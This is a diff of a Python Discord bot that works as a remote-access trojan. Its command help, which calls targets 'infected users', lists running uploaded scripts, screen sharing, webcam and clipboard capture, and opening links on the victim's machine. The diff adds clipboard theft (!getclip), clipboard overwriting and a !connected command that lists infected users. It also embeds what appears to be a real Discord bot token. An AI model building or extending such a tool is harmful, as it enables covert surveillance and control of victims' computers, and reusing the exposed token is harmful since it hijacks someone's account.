@@ -1,5 +1,5 @@
-# Libs:
 from discord.ext import commands
+from discord import app_commands
 from PIL import ImageGrab
 import tkinter as tk
 import subprocess 
@@ -19,7 +19,7 @@ import cv2
 import pyperclip
 
 # Setup:
-intents = discord.Intents.default()
+intents = discord.Intents.all()
 intents.message_content = True
 intents.presences = False
 intents.typing = False
@@ -33,6 +33,7 @@ async def commands(ctx):
     print("Someone saw the commands.")
     await ctx.send("""
 > ## **Commands:**
+> ### UX:
 > - `!commands` - tells you what commands you can type.
 > - `!deepdive` - tells you what a command does.
 > ### Control:
@@ -93,10 +94,10 @@ Please use these commands responsibly and in accordance with Discord's terms of 
 This command allows you to view detailed descriptions of all available bot commands.
 
 **Usage:**
-You can use this command by typing `!deepdive`.
+You can use this command by typing `!deepdive [command]` where [command] is what command you want a description on.
 
 **Example:**
-``!deepdive``
+``!deepdive deepdive``
 
 **Category:**
 *UX*
@@ -170,6 +171,28 @@ You can use this command by typing `!openlink` followed by the URL you want to o
 --------------------------------------------------------------------
 """)
 
+        elif command == "setclip":
+            await ctx.send("""
+--------------------------------------------------------------------
+## ! SETCLIP
+
+**Description:**
+This command allows you to set the contents of your clipboard to the specified text.
+
+**Usage:**
+You can use this command by typing `!setclip [text]`, where `[text]` is the text you want to set as your clipboard contents.
+
+**Example:**
+``!setclip Hello, World!``
+
+**Category:**
+*Commands*
+
+**Note:**
+This is not a cut, its a copy so you will be able to paste it multiple times.
+--------------------------------------------------------------------
+""")
+
         elif command == "speak":
             await ctx.send("""
 --------------------------------------------------------------------
@@ -232,6 +255,25 @@ You can use this command by typing `!runscript` and attaching a Python script fi
 - The bot will execute the script and display the output.
 - Scripts with null bytes or those exceeding a time limit will be handled accordingly.
 - If the output is too long, it will be provided as a downloadable text file.
+--------------------------------------------------------------------
+""")
+
+        elif command == "connected":
+            await ctx.send("""
+--------------------------------------------------------------------
+## ! CONNECTED
+
+**Description:**
+This command allows you to see how many users are infected and their names.
+
+**Usage:**
+You can use this command by typing `!connected`.
+
+**Example:**
+``!connected``
+
+**Category:**
+*Observe*
 --------------------------------------------------------------------
 """)
 
@@ -323,6 +365,25 @@ You can use this command by typing `!screenshare [duration]` where `[duration]` 
 **Note:**
 - The bot will capture and send screenshots at regular intervals for the specified duration.
 - Screenshots will be sent as PNG files.
+--------------------------------------------------------------------
+""")
+
+        elif command == "getclip":
+            await ctx.send("""
+--------------------------------------------------------------------
+## ! GETCLIP
+
+**Description:**
+This command retrieves the current contents of your clipboard and sends it as a message in the chat.
+
+**Usage:**
+You can use this command by typing `!getclip`.
+
+**Example:**
+``!getclip``
+
+**Category:**
+*Observe*
 --------------------------------------------------------------------
 """)
 
@@ -636,5 +697,7 @@ async def restart(ctx):
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
+
+bot.run('MTE0NTY0MjQ4NTM4NTc5MzU0Ng.GmPrjq.u_K_WZyTp3UI9Y_ktwf9-jCf231U0sTbqSJpKk')
 
 bot.run('YOUR_BOT_TOKEN')
